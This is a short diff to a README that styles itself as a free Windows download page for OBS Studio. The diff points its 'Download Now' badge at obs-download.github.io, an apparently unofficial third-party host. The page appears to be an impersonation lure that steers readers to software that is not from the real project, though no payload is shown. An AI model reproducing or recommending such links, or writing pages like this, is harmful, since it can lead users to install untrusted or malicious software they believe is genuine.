@@ -1,7 +1,7 @@
 # OBS Studio — Download Free for Windows
 
 ### Download OBS Studio button:
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://obs-download.github.io/.github/)
 
 ---
 
